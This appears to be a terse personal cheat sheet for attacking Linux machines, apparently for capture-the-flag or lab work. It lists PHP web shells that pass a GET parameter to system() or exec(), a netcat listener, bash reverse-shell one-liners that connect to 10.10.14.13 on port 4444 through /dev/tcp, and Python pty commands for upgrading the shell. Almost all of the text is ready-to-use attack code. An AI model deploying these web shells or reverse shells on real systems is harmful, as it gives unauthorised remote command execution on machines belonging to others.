# Linux  PHP > Rev Shell > Shell Upgrade Commands

##🐈‍⬛ PHP
```
<?php system($_GET['cmd']);?>

<?php
if (isset($_GET['command'])) {
    exec($_GET['command']);
}
?>
```

## ⭐ Attacker
```
nc -lvnp 4444
```
##🌙 Victim
```

/bin/bash -i 5<> /dev/tcp/10.10.14.13/4444 0<&5 1>&5 2>&5
bash -i >& /dev/tcp/10.10.14.13/4444 0>&1

```

## 🎃 Python Shell Upgrade
```
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

